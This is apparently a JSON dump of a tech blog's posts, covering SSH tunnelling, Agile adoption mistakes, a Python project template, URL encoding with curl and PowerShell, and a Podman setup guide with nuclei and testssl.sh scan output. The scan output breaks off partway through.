Secure Shell (SSH) Trisul: Detecting SSH Tunnels Tools for SSH Tunnelling # These are the tools used for automating SSH tunnelling creation.\nautossh sshtunnel Cloudflare: Tunnel ngrok About SSH Protocol Stack # SSH is organized as 3 protocols that run on top of TCP: SSH User Authentication Protocol, SSH Connection Protocol, SSH Transport Layer Protocol.\nSSH Transport Layer responsbile for server authentication, confgidentiality, integrity and compression. focus on the 3 functions: Host Keys, Packet Exchange, and Key Generation. SSH User Authentication Protocol responsbile for authenticates user/client to the server. focus on main 3 functions: Message Types and Formats, Message Exchange and Authentication Methods. SSH Connection Protocol responsible for multiplexes the encrypted tunnel into several logical channel. focus on main 3 functions: Channel Mechanism, Channel Types and Port Forwarding. +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | SSH_User_Auth | SSH_Connection | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | + SSH_Transport_Layer + | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | TCP | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | IP | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Here\u0026rsquo;s the cmd that I generate the SSH protocol stack above: $ protocol \u0026quot;SSH_User_Auth:16,SSH_Connection:16,SSH_Transport_Layer:64,TCP:32,IP:32\u0026quot; -n\nLinks # SSH Protocol Stack Trisul-scripts HoldMyBeer: Detecting SSH Brute Forcing with Zeek Mozilla OpenSSH Security Guide: Providing a sane baseline policy recommendation for SSH configuration parameters (eg. Ciphers, MACs, and KexAlgos). ","date":"2023-09-05 21:18","externalUrl":null,"permalink":"/posts/ssh_port_forwarding/","section":"posts","summary":"Quick notes on tunnelling with SSH port forwarding.","title":"Tunnelling with SSH Port Forwarding","type":"posts"},{"content":"","date":"2023-09-01 23:24","externalUrl":null,"permalink":"/tags/agile/","section":"tags","summary":"","title":"agile","type":"tags"},{"content":"","date":"2023-09-01 23:24","externalUrl":null,"permalink":"/tags/mindset/","section":"tags","summary":"","title":"mindset","type":"tags"},{"content":" Agile Framework # The very first common mistake, is thinking that using a framework or agile method automatically makes a company agile.\nUnfortunately, this is something that often happens at management level.\nVery often, Agile is being compared (justified) against the Waterfall methodology. Back in 2006, that is the first time I heard about Agile. It is being tagged as more flexible, which allow for a team to pivot and make change much easier.\nHowever, being more flexible does not always lead to being more productive.\nDo flexible working hours improve productivity?\nBefore we dive into the common mistakes and challenges in adopting Agile, let me define what Agile means for me.\nMost of the Agile methodologies (like Scrum, Lean, XP or Kanban) are developed with software development in mind. Agile emphasizes delivering products in small increments. (Incremental delivery can come with many advantages and disadvantages) Agile isn\u0026rsquo;t for everyone. (Can Agile be used for operations?) Agile is about customer-focused. There are 3 must-known terms in Agile:\n1. Epic An Epic is a large and high-level piece of work that is too big to be completed in a single iteration (sprint). Epics are often divided into smaller, manageable units like features and user stories. Epics provide a way to capture and organize broader goals or initiatives. 2. Feature A Feature is a more detailed and manageable chunk of work that is derived from an Epic. It represents a distinct functionality or capability that adds value to the product. Features are typically broken down further into user stories. 3. User Story A User Story is a small, specific requirement that describes a piece of functionality from an end user's perspective. It's typically written in a simple format: \"As a [type of user], I want [an action] so that [a benefit].\" User stories help in defining the specifics of what needs to be developed and serve as a basis for prioritization and development within an Agile team. In summary, Epics are high-level goals or initiatives, Features are distinct functional chunks derived from Epics, and User Stories are specific requirements from an end user\u0026rsquo;s viewpoint that make up the Features. This hierarchical structure helps Agile teams manage and develop complex projects incrementally and iteratively.\nCommon Mistakes in Agile # The second big mistake that harms the Agile mindset is the challenge of shifting teams\u0026rsquo; attention from ticketing systems and their associated issues.\nFor example, using ticketing systems can be distracting when discussing with customer/user. The conversation often center around breaking down tasks and inputting data, overshadowing the understanding of customer issues/needs. Instead of delving into customer problems, teams get stuck staring at a screen, waiting for data entry. They have extensive discussions about task types, required fields, and acceptance criteria templates.\nAs a result, teams focus more on administrative tasks rather than asking the right questions, having valuable discussions, and truly understanding customer needs.\nHaving a problem tracking system with agile project management doesn\u0026rsquo;t make your organization agile.\nRemember, a user story:\nis NOT a work item is NOT a scope of work is simply a story: a narrative. should have the states of work: empathise with user, discussing, doing work, and getting feedback. (not \u0026ldquo;work in progress\u0026rdquo;, \u0026ldquo;integration\u0026rdquo;, \u0026ldquo;testing\u0026rdquo;, \u0026ldquo;validation\u0026rdquo;) should help us to pay attention to user/customer benefits and increases the emphasis on avoiding unnecessary work. Simply labeling levels in a scope breakdown structure as epics, initiatives, features, or stories does not transform your organization into an agile one.\nAgile vs ITSM # A very common question is: ITSM is based on a more structured process approach which always categoried as operation guidelines, and agile is categorized as development concept. Can both be mixed?\nThis question has invariably led to a perception that the two worlds cannot mix. Since Agile espouses methods that are adaptive and people-oriented rather than predictive and process oriented, then the thinking has been that this is counter to ITSM which adopts a more process-centric approach.\nAccording to Agile ITSM: How Agile \u0026amp; Service Management Can Work Together, agile and ITSM have a lot of synergies. Putting the two(2) together can provide value to enterprise.\nThe article above walk us through the Agile Manifesto, and show us how can the 2 be mixed. Here is the snippet:\nWe value individuals and interactions over processes and tools We value working software over comprehensive documentation We value customer collaboration over contract negotiation We value responding to change over following a plan Challenges in Adopting Agile # Why I call it \u0026ldquo;challenges\u0026rdquo; instead of \u0026ldquo;disadvantages\u0026rdquo;? Challenges can be seen as opportunities for growth and improvement, while disadvantages typically represent drawbacks or unfavorable conditions.\nAgile isn\u0026rsquo;t suitable for everyone; it\u0026rsquo;s meant for those with an open mindset and the courage to embrace change. It\u0026rsquo;s also for those who recognize its challenges and drawbacks, yet are ready to invest effort and resources for growth and improvement.\n1. Resource Planning Uncertainty Agile's dynamic nature makes early resource planning challenging, especially for larger projects. 2. Documentation and Detail Agile's \"just-in-time\" approach to documentation can lead to less detailed records. 3. Fragmented Product Development Incremental delivery can result in fragmented products rather than cohesive outputs. 4. Continuous Development without Clear Endpoint Agile's adaptable planning can lead to ongoing feature additions without a definite project endpoint. 5. Management Alignment Gaining full management support for Agile principles and changes can be difficult. 6. Testing and Quality Assurance Agile's continuous testing demands effective coordination and clear criteria. 7. Team Ownership and Cultural Shift Instilling self-ownership and Agile principles across teams requires overcoming resistance and promoting collaboration. 8. Financial and Performance Challenges Aligning Agile's adaptable approach with traditional financial planning and addressing performance issues can pose difficulties. My last note: The last mistake to avoid before starting Agile Transitioning to Agile from non-Agile methods can be challenging due to ingrained habits, but awareness of these common obstacles empowers effective resolution and enhances the implementation of Agile methodology.\nIn conclusion, prior knowledge of these prevalent challenges can facilitate their effective resolution, thereby will enhance the implementation of the Agile methodology and increase the chance to be success.\nLinks # Agile vs Operations Did a software ticketing system kill your agility? ","date":"2023-09-01 23:24","externalUrl":null,"permalink":"/posts/challenges_in_agile/","section":"posts","summary":"Thinking of using a framework or agile method will NOT automatically makes a company agile.","title":"Mistakes and Challenges in Agile","type":"posts"},{"content":"Here is how I start a Python project for myself.\nCreating Template for Python Project # Create a Python project folder. Create virtual environment for project. Create the base file. ~ $ mkdir webping_project ~ $ cd webping_project ~/webping_project $ ~/webping_project $ python3.11 -m venv .venv ~/webping_project $ source .venv/bin/activate ~/webping_project $ ~/webping_project $ pip install requests ~/webping_project $ pip freeze \u0026gt; requirements.txt ~/webping_project $ ~/webping_project $ vim main.py ~/webping_project $ Executing Python Project # Link the project file. Execute the project. ~/webping_project $ ln -s main.py __main__.py ~/webping_project $ ls -l total 8.0K lrwxrwxrwx 1 xx xx 7 Aug 24 16:57 __main__.py -\u0026gt; main.py* -rwxr-xr-x 1 xx xx 2.9K Aug 24 16:54 main.py* -rw-r--r-- 1 xx xx 154 Aug 24 16:56 requirements.txt ~/webping_project $ ~/webping_project $ cd .. ~ $ ~ $ python webping_project usage: webping_project [-h] [-v] url [url ...] webping_project: error: the following arguments are required: url Here is how to execute the project in a more concise and elegant way. It makes it easier for others to use a project.\n~ $ deactivate ~ $ ~ $ python webping_project -v https://www.google.com * https://www.google.com [200] Google * https://www.google.com [200] Google * https://www.google.com [200] Google * https://www.google.com [200] Google ^C [*] DONE Of course, the old way to run a project can be:\n~ $ python webping_project/main.py -v https://www.google.com\n","date":"2023-08-25 01:30","externalUrl":null,"permalink":"/posts/python_project/","section":"posts","summary":"Elegant way to execute Python project.","title":"Python Project","type":"posts"},{"content":"The process of conversion of data from one form to another form is known as Encoding. It is used to transform the data so that data can be supported and used by different systems. And encoding in Computing is an important process to ensure data/information can be properly consumed.\nCharacter Encoding # Character encoding encodes characters into bytes which include 3 types of encodings.\nHTML Encoding # Whenever an HTML document contains special characters outside the range of 7-bit ASCII, it is very important to ensure there is a proper character encoding to display the information correctly. Thus a standardize HTML encoding standard is required. Below are the HTML standards with the supported encoding character sets.\nStandard Character set supported HTML4 ISO-8859-1 (default), UTF-8 HTML5 UTF-8 (default) Windows ANSI (Windows-1252) or ISO-8859-1 [ANSI has extra 32 char] There are 2 methods to specify which character encoding is used in a HTML document. First, the web server can include charset in the HTTP Content-Type header:\nContent-Type: text/html; charset=utf-8 Second, a declaration of character encoding set be included within HTML document.\nHTML4 document can include the following information inside the head section which near the top of the document.\n\u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt; HTML5 will contain the following as the first line:\n\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; URL Encoding # URL encoding converts characters into a format that can be transmitted over the Internet. Very often, URL contains some characters outside the ASCII set, thus RUL has to be converted into a valid set of ASCII format. And URL encoding is used to replaces any unsafe ASCII characters with a \u0026ldquo;%\u0026rdquo; followed by two hexadecimal.\nFor example, URL cannot contain any space. And URL encoding will replace a with a plus + sign or %20.\nHere is a valid use case why URL encoding is important to Cybersecurity. Supposed I have the following set of login credential:\nuser = admin pase = secure0'9passwd Note that the password above contain a single quote ' in between in order to comply with password policy.\nNow, if I use the above login credential with curl to login to a webapp:\n$ curl -s -k -L -d \u0026#34;username=admin\u0026amp;password=secure0\u0026#39;9passwd\u0026#34; \\ https://webapp.example.org It will still work because I can use double quotation \u0026quot;. However, if I have to pass the command through SSH connection, then I have to use URL encoding to achieve the goal (as below):\n$ ssh user@server \\ \u0026#39;curl -s -k -L -d \u0026#34;username%3Dadmin%26password%3Dsecure0%279passwd\u0026#34; https://webapp.example.org\u0026#39; Notice that the = has been encoded to %3D; \u0026amp; has been encoded to %26; ' has been encoded to %27.\nHere are the 3 methods I use to perform URL encoding.\nFirst, construct a curl command as below with --data-urlencode, and capture the encoded string at the header.\n$ curl -I -v -G curl --get --data-urlencode \u0026#34;username=admin\u0026amp;password=secure0\u0026#39;9passwd\u0026#34; http://localhost * Could not resolve host: curl * Closing connection 0 curl: (6) Could not resolve host: curl * Trying 127.0.0.1:80... * Connected to localhost (127.0.0.1) port 80 (#1) \u0026gt; HEAD /?username=admin%26password%3Dsecure0%279passwd HTTP/1.1 \u0026gt; Host: localhost \u0026gt; User-Agent: curl/7.81.0 \u0026gt; Accept: */* \u0026gt; Second, use PowerShell (as below):\nPS\u0026gt; [Reflection.Assembly]::LoadWithPartialName(\u0026#34;System.Web\u0026#34;) | Out-Null PS\u0026gt; [System.Web.HttpUtility]::UrlEncode(\u0026#34;username=admin\u0026amp;password=secure0\u0026#39;9passwd\u0026#34;) username%3dadmin%26password%3dsecure0%279passwd PS\u0026gt; Last, install gridsite-clients package, and use the urlencode command (as below):\n$ sudo apt install gridsite-clients $ $ urlencode \u0026#34;username=admin\u0026amp;password=secure0\u0026#39;9passwd\u0026#34; username%3Dadmin%26password%3Dsecure0%279passwd ASCII Encoding # ASCII is the first character encoding standard which defined 128 different chanracters that used on the Internet:\nnumbers (0~9) english letters (AZ, az) special characters (~!@#$%^\u0026amp;*) Links # HTML Encoding (Character Sets) URL Encoding Reference ","date":"2023-08-12 13:00","externalUrl":null,"permalink":"/posts/encoding_101/","section":"posts","summary":"Some notes about encoding: HTML encoding, \u003cem\u003e\u003cstrong\u003eURL encoding\u003c/strong\u003e\u003c/em\u003e and ASCII encoding.","title":"Encoding 101","type":"posts"},{"content":"","date":"2023-08-04 10:34","externalUrl":null,"permalink":"/tags/podman/","section":"tags","summary":"","title":"podman","type":"tags"},{"content":" Install Podman # Launch an Ubuntu instance with Multipass Install podman Setup and configure podman Start with new Ubuntu instance # PS\u0026gt; multipass launch -n primary PS\u0026gt; multipass shell primary Install Podman and Setup Registry # ubuntu@primary:~$ sudo apt update ubuntu@primary:~$ sudo apt install podman ubuntu@primary:~$ podman -v ubuntu@primary:~$ sudo sed -i \u0026#34;s/# unqualified-search-registries.*/unqualified-search-registries\\ =\\ [\\\u0026#34;docker.io\\\u0026#34;]/\u0026#34; /etc/containers/registries.conf ubuntu@primary:~$ podman info Setup and Configure Podman # ubuntu@primary:~$ sudo apt install podman-docker ubuntu@primary:~$ docker -v Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg. podman version 3.4.4 ubuntu@primary:~$ pip3 install podman-compose ubuntu@primary:~$ export PATH=$PATH:$HOME/.local/bin ubuntu@primary:~$ podman-compose -v podman-compose version: 1.0.6 [\u0026#39;podman\u0026#39;, \u0026#39;--version\u0026#39;, \u0026#39;\u0026#39;] using podman version: 3.4.4 podman-compose version 1.0.6 podman --version podman version 3.4.4 exit code: 0 Using Podman # Some basic commands ubuntu@primary:~$ podman search ubuntu ubuntu@primary:~$ podman pull ubuntu ubuntu@primary:~$ podman images ubuntu@primary:~$ podman ps -a To run a container ubuntu@primary:~$ podman run -dit --name jimny ubuntu ubuntu@primary:~$ podman attach jimny Create Image from Container ubuntu@primary:~$ podman commit --author \u0026#34;xx\u0026#34; 044291b04ebd Start, Stop, or Remove a Container ubuntu@primary:~$ podman start 044291b04ebd ubuntu@primary:~$ podman stop 044291b04ebd ubuntu@primary:~$ podman rm 044291b04ebd Run nuclei scan against multiple websites with latest templates # ubuntu@primary:~$ docker pull projectdiscovery/nuclei:latest ubuntu@primary:~$ docker images ubuntu@primary:~$ docker run -it 145d6df485f8 --version [INF] Nuclei Engine Version: v2.9.10 ubuntu@primary:~$ docker run -it 145d6df485f8 -update ubuntu@primary:~$ docker run -it 145d6df485f8 -ut ubuntu@primary:~$ ubuntu@primary:~$ echo htts://www.apache.org \u0026gt; urls.txt ubuntu@primary:~$ echo https://nginx.org \u0026gt;\u0026gt; urls.txt ubuntu@primary:~$ ubuntu@primary:~$ cat urls.txt | docker run -v /home/ubuntu/nuclei-templates:/go/src/app/ -i projectdiscovery/nuclei -t ./technologies/nginx/nginx-version.yaml -t ./technologies/apache/apache-detect.yaml [apache-detect] [http] [info] https://www.apache.org [Apache] [nginx-version] [http] [info] https://nginx.org [nginx/1.23.4] ubuntu@primary:~$ Run testssl.sh scan against example.com # ubuntu@primary:~$ podman podman run --rm -ti drwetter/testssl.sh example.com Resolving \u0026#34;drwetter/testssl.sh\u0026#34; using unqualified-search registries (/etc/containers/registries.conf) Trying to pull docker.io/drwetter/testssl.sh:latest... Getting image source signatures Copying blob d332f0a45b59 done Copying blob ad3b14100fb2 done Copying blob 11774c69ea68 done Copying config 86ebbcc949 done Writing manifest to image destination Storing signatures ########################################################### testssl.sh 3.2rc2 from https://testssl.sh/dev/ This program is free software. Distribution and modification under GPLv2 permitted. USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK! Please file bugs @ https://testssl.sh/bugs/ ########################################################### Using \u0026#34;OpenSSL 1.0.2-bad (1.0.2k-dev)\u0026#34; [~183 ciphers] on 77be7462cb16:/home/testssl/bin/openssl.Linux.x86_64 (built: \u0026#34;Sep 1 14:03:44 2022\u0026#34;, platform: \u0026#34;linux-x86_64\u0026#34;) Start 2023-08-04 02:29:58 --\u0026gt;\u0026gt; 93.184.216.34:443 (example.com) \u0026lt;\u0026lt;-- Further IP addresses: 2606:2800:220:1:248:1893:25c8:1946 rDNS (93.184.216.34): -- Service detected: HTTP Testing protocols via sockets except NPN+ALPN SSLv2 not offered (OK) SSLv3 not offered (OK) TLS 1 offered (deprecated) TLS 1.1 offered (deprecated) TLS 1.2 offered (OK) TLS 1.3 offered (OK): final NPN/SPDY h2, http/1.1, http/1.0, h3, h3-29, h3-Q050, h3-Q046, h3-Q043 (advertised) ALPN/HTTP2 h2, http/1.1 (offered) Testing cipher categories NULL ciphers (no encryption) not offered (OK) Anonymous NULL Ciphers (no authentication) not offered (OK) Export ciphers (w/o ADH+NULL) not offered (OK) LOW: 64 Bit + DES, RC[2,4], MD5 (w/o export) not offered (OK) Triple DES Ciphers / IDEA not offered Obsoleted CBC ciphers (AES, ARIA etc.) offered Strong encryption (AEAD ciphers) with no FS offered (OK) Forward Secrecy strong encryption (AEAD ciphers) offered (OK) Testing server\u0026#39;s cipher preferences Hexcode Cipher Suite Name (OpenSSL) KeyExch. Encryption Bits Cipher Suite Name (IANA/RFC) ----------------------------------------------------------------------------------------------------------------------------- SSLv2 - SSLv3 - TLSv1 (server order) xc013 ECDHE-RSA-AES128-SHA ECDH 256 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA xc014 ECDHE-RSA-AES256-SHA ECDH 256 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA x33 DHE-RSA-AES128-SHA DH 2048 AES 128 TLS_DHE_RSA_WITH_AES_128_CBC_SHA x39 DHE-RSA-AES256-SHA DH 2048 AES 256 TLS_DHE_RSA_WITH_AES_256_CBC_SHA x88 DHE-RSA-CAMELLIA256-SHA DH 2048 Camellia 256 TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA x45 DHE-RSA-CAMELLIA128-SHA DH 2048 Camellia 128 TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA x35 AES256-SHA RSA AES 256 TLS_RSA_WITH_AES_256_CBC_SHA x84 CAMELLIA256-SHA RSA Camellia 256 TLS_RSA_WITH_CAMELLIA_256_CBC_SHA x2f AES128-SHA RSA AES 128 TLS_RSA_WITH_AES_128_CBC_SHA x41 CAMELLIA128-SHA RSA Camellia 128 TLS_RSA_WITH_CAMELLIA_128_CBC_SHA x9a DHE-RSA-SEED-SHA DH 2048 SEED 128 TLS_DHE_RSA_WITH_SEED_CBC_SHA x96 SEED-SHA RSA SEED 128 TLS_RSA_WITH_SEED_CBC_SHA TLSv1.1 (server order) xc013 ECDHE-RSA-AES128-SHA ECDH 256 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA xc014 ECDHE-RSA-AES256-SHA ECDH 256 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA x33 DHE-RSA-AES128-SHA DH 2048 AES 128 TLS_DHE_RSA_WITH_AES_128_CBC_SHA x39 DHE-RSA-AES256-SHA DH 2048 AES 256 TLS_DHE_RSA_WITH_AES_256_CBC_SHA x88 DHE-RSA-CAMELLIA256-SHA DH 2048 Camellia 256 TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA x45 DHE-RSA-CAMELLIA128-SHA DH 2048 Camellia 128 TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA x35 AES256-SHA RSA AES 256 TLS_RSA_WITH_AES_256_CBC_SHA x84 CAMELLIA256-SHA RSA Camellia 256 TLS_RSA_WITH_CAMELLIA_256_CBC_SHA x2f AES128-SHA RSA AES 128 TLS_RSA_WITH_AES_128_CBC_SHA x41 CAMELLIA128-SHA RSA Camellia 128 TLS_RSA_WITH_CAMELLIA_128_CBC_SHA x9a DHE-RSA-SEED-SHA DH 2048 SEED 128 TLS_DHE_RSA_WITH_SEED_CBC_SHA x96 SEED-SHA RSA SEED 128 TLS_RSA_WITH_SEED_CBC_SHA TLSv1.2 (server order) xc02f ECDHE-RSA-AES128-GCM-SHA256 ECDH 256 AESGCM 128 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 xc030 ECDHE-RSA-AES256-GCM-SHA384 ECDH 256 AESGCM 256 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 x9e DHE-RSA-AES128-GCM-SHA256 DH 2048 AESGCM 128 TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 x9f DHE-RSA-AES256-GCM-SHA384 DH 2048 AESGCM 256 TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 xc027 ECDHE-RSA-AES128-SHA256 ECDH 256 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 xc013 ECDHE-RSA-AES128-SHA ECDH 256 AES 128 TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA xc028 ECDHE-RSA-AES256-SHA384 ECDH 256 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 xc014 ECDHE-RSA-AES256-SHA ECDH 256 AES 256 TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA x67 DHE-RSA-AES128-SHA256 DH 2048 AES 128 TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 x33 DHE-RSA-AES128-SHA DH 2048 AES 128 TLS_DHE_RSA_WITH_AES_128_CBC_SHA x6b DHE-RSA-AES256-SHA256 DH 2048 AES 256 TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 x39 DHE-RSA-AES256-SHA DH 2048 AES 256 TLS_DHE_RSA_WITH_AES_256_CBC_SHA x9c AES128-GCM-SHA256 RSA AESGCM 128 TLS_RSA_WITH_AES_128_GCM_SHA256 x88 DHE-RSA-CAMELLIA256-SHA DH 2048 Camellia 256 TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA x45 DHE-RSA-CAMELLIA128-SHA DH 2048 Camellia 128 TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA x35 AES256-SHA RSA AES 256 TLS_RSA_WITH_AES_256_CBC_SHA x84 CAMELLIA256-SHA RSA Camellia 256 TLS_RSA_WITH_CAMELLIA_256_CBC_SHA x2f AES128-SHA RSA AES 128 TLS_RSA_WITH_AES_128_CBC_SHA x41 CAMELLIA128-SHA RSA Camellia 128 TLS_RSA_WITH_CAMELLIA_128_CBC_SHA x9a DHE-RSA-SEED-SHA DH 2048 SEED 128 TLS_DHE_RSA_WITH_SEED_CBC_SHA x96 SEED-SHA RSA SEED 128 TLS_RSA_WITH_SEED_CBC_SHA TLSv1.3 (server order) x1302 TLS_AES_256_GCM_SHA384 ECDH 256 AESGCM 256 TLS_AES_256_GCM_SHA384 x1303 TLS_CHACHA20_POLY1305_SHA256 ECDH 256 ChaCha20 256 TLS_CHACHA20_POLY1305_SHA256 x1301 TLS_AES_128_GCM_SHA256 ECDH 256 AESGCM 128 TLS_AES_128_GCM_SHA256 Has server cipher order? yes (OK) -- TLS 1.3 and below Testing robust forward secrecy (FS) -- omitting Null Authentication/Encryption, 3DES, RC4 FS is offered (OK) TLS_AES_256_GCM_SHA384 TLS_CHACHA20_POLY1305_SHA256 ECDHE-RSA-AES256-GCM-SHA384 ECDHE-RSA-AES256-SHA384 ECDHE-RSA-AES256-SHA DHE-RSA-AES256-GCM-SHA384 DHE-RSA-AES256-SHA256 DHE-RSA-AES256-SHA DHE-RSA-CAMELLIA256-SHA TLS_AES_128_GCM_SHA256 ECDHE-RSA-AES128-GCM-SHA256 ECDHE-RSA-AES128-SHA256 ECDHE-RSA-AES128-SHA DHE-RSA-AES128-GCM-SHA256 DHE-RSA-AES128-SHA256 DHE-RSA-AES128-SHA DHE-RSA-SEED-SHA DHE-RSA-CAMELLIA128-SHA Elliptic curves offered: prime256v1 DH group offered: Unknown DH group (2048 bits) TLS 1.2 sig_algs offered: RSA-PSS-RSAE+SHA256 RSA-PSS-RSAE+SHA384 RSA-PSS-RSAE+SHA512 RSA+SHA256 RSA+SHA384 RSA+SHA512 RSA+SHA224 RSA+SHA1 TLS 1.3 sig_algs offered: RSA-PSS-RSAE+SHA256 RSA-PSS-RSAE+SHA384 RSA-PSS-RSAE+SHA512 Testing server defaults (Server Hello) TLS extensions (standard) \u0026#34;renegotiation info/#65281\u0026#34; \u0026#34;EC point formats/#11\u0026#34; \u0026#34;session ticket/#35\u0026#34; \u0026#34;status request/#5\u0026#34; \u0026#34;next protocol/#13172\u0026#34; \u0026#34;supported versions/#43\u0026#34; \u0026#34;key share/#51\u0026#34; \u0026#34;max fragment length/#1\u0026#34; \u0026#34;application layer protocol negotiation/#16\u0026#34; \u0026#34;encrypt-then-mac/#22\u0026#34; \u0026#34;extended master secret/#23\u0026#34; Session Ticket RFC 5077 hint 7200 seconds, session tickets keys seems to be rotated \u0026lt; daily SSL Session ID support yes Session Resumption Tickets no, ID: no TLS clock skew Random values, no fingerprinting possible Certificate Compression none Client Authentication none Signature Algorithm SHA256 with RSA Server key size RSA 2048 bits (exponent is 65537) Server key usage Digital Signature, Key Encipherment Server extended key usage TLS Web Server Authentication, TLS Web Client Authentication Serial 0C1FCB184518C7E3866741236D6B73F1 (OK: length 16) Fingerprints SHA1 F2AAD73D32683B716D2A7D61B51C6D5764AB3899 SHA256 5EF2F214260AB8F58E55EEA42E4AC04B0F171807D8D1185FDDD67470E9AB6096 Common Name (CN) www.example.org subjectAltName (SAN) www.example.org example.net example.edu example.com example.org www.example.com www.example.edu www.example.net Trust (hostname) Ok via SAN (same w/o SNI) Chain of trust Ok EV cert (experimental) no Certificate Validity (UTC) 193 \u0026gt;= 60 days (2023-01-13 00:00 --\u0026gt; 2024-02-13 23:59) ETS/\u0026#34;eTLS\u0026#34;, visibility info not present Certificate Revocation List http://crl3.digicert.com/DigiCertTLSRSASHA2562020CA1-4.crl http://crl4.digicert.com/DigiCertTLSRSASHA2562020CA1-4.crl OCSP URI http://ocsp.digicert.com OCSP stapling offered, not revoked OCSP must staple extension -- DNS CAA RR (experimental) not offered Certificate Transparency yes (certificate extension) Certificates provided 2 Issuer DigiCert TLS RSA SHA256 2020 CA1 (DigiCert Inc from US) Intermediate cert validity #1: ok \u0026gt; 40 days (2031-04-13 23:59). DigiCert TLS RSA SHA256 2020 CA1 \u0026lt;-- DigiCert Global Root CA Intermediate Bad OCSP (exp.) Ok Testing HTTP header response @ \u0026#34;/\u0026#34; HTTP Status Code 200 OK HTTP clock skew +570838 sec from localtime HTTP Age (RFC 7234) 570838 Strict Transport Security not offered Public Key Pinning -- Server banner ECS (oxr/830C) Application banner -- Cookie(s) (none issued at \u0026#34;/\u0026#34;) Security headers Cache-Control: max-age=604800 Reverse Proxy banner X-Cache: HIT Testing vulnerabilities Heartbleed (CVE-2014-0160) not vulnerable (OK), no heartbeat extension CCS (CVE-2014-0224) not vulnerable (OK) Ticketbleed (CVE-2016-9244), experiment. not vulnerable (OK) ROBOT not vulnerable (OK) Secure Renegotiation (RFC 5746) supported (OK) Secure Client-Initiated Renegotiation not vulnerable (OK) CRIME, TLS (CVE-2012-4929) not vulnerable (OK) BREACH (CVE-2013-3587) potentially NOT ok, \u0026#34;gzip deflate\u0026#34; HTTP compression detected. - only supplied \u0026#34;/\u0026#34; tested Can be ignored for static pages or if no secrets in the page POODLE, SSL (CVE-2014-3566) not vulnerable (OK), no SSLv3 support TLS_FALLBACK_SCSV (RFC 7507) Downgrade attack prevention supported (OK) SWEET32 (CVE-2016-2183, CVE-2016-6329) not vulnerable (OK) FREAK (CVE-2015-0204) not vulnerable (OK) DROWN (CVE-2016-0800, CVE-2016-0703) not vulnerable on this host and port (OK) make sure you don\u0026#39;t use this certificate elsewhere with SSLv2 enabled services, see https://search.censys.io/search?resource=hosts\u0026amp;virtual_hosts=INCLUDE\u0026amp;q=5EF2F214260AB8F58E55EEA42E4AC04B0F171807D8D1185FDDD67470E9AB6096 LOGJAM (CVE-2015-4000), experimental not vulnerable (OK): no DH EXPORT ciphers, no common prime detected BEAST (CVE-2011-3389) TLS1: ECDHE-RSA-AES128-SHA ECDHE-RSA-AES256-SHA DHE-RSA-AES128-SHA DHE-RSA-AES256-SHA DHE-RSA-CAMELLIA256-SHA DHE-RSA-CAMELLIA128-SHA AES256-SHA CAMELLIA256-SHA AES128-SHA CAMELLIA128-SHA DHE-RSA-SEED-SHA SEED-SHA VULNERABLE -- but also supports higher protocols TLSv1.1 TLSv1.2 (likely mitigated) LUCKY13 (CVE-2013-0169), experimental potentially VULNERABLE, uses cipher block chaining (CBC) ciphers with TLS. Check patches Winshock (CVE-2014-6321), experimental not vulnerable (OK) RC4 (CVE-2013-2566, CVE-2015-2808) no RC4 ciphers detected (OK) Running client simulations (HTTP) via sockets Browser Protocol Cipher Suite Name (OpenSSL) Forward Secrecy ------------------------------------------------------------------------------------------------ Android 6.0 TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Android 7.0 (native) TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Android 8.1 (native) TLSv1.2 ECDHE-RSA-AES128-GCM-SHA256 256 bit ECDH (P-256) Android 9.0 (native) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Android 10.0 (native) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Android 11 (native) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Android 12 (native) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Chrome 79 (Win 10) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Chrome 101 (Win 10) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Firefox 66 (Win 8.1/10) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) Firefox 100 (Win 10) TLSv1.3 TLS_AES_256_GCM_SHA384 256 bit ECDH (P-256) IE 6 